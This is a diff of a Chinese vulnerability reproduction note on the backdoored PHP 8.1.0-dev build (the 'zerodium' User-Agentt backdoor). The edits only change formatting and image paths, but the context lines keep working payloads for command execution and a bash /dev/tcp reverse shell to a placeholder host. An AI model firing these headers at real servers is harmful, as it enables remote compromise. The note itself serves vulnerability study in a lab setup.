@@ -6,9 +6,9 @@ PHP 8.1.0-dev 版本在 2021 年 3 月 28 日被植入后门，但是后门很�
 
 参考链接：
 
-- https://news-web.php.net/php.internals/113838
-- https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
-- https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
+* https://news-web.php.net/php.internals/113838
+* https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
+* https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
 
 ## 漏洞影响
 
@@ -42,15 +42,15 @@ docker compose up -d
 User-Agentt: zerodiumvar_dump(233*233);
 ```
 
-![](images/PHP%208.1.0-dev%20开发版本%20zerodium%20后门漏洞/image-20240529084958596.png)
+![](../.gitbook/assets/image-20240529084958596.png)
 
 执行命令：
 
-```plain
+```
 User-Agentt: zerodiumsystem("id");
 ```
 
-![](images/PHP%208.1.0-dev%20开发版本%20zerodium%20后门漏洞/image-20240529085013250.png)
+![](../.gitbook/assets/image-20240529085013250.png)
 
 反弹 shell：
 
@@ -58,4 +58,4 @@ User-Agentt: zerodiumsystem("id");
 User-Agentt: zerodiumsystem("bash -c 'exec bash -i &> /dev/tcp/<your-ip>/<port> <& 1'");
 ```
 
-![](images/PHP%208.1.0-dev%20开发版本%20zerodium%20后门漏洞/image-20240529085117047.png)
+![](../.gitbook/assets/image-20240529085117047.png)
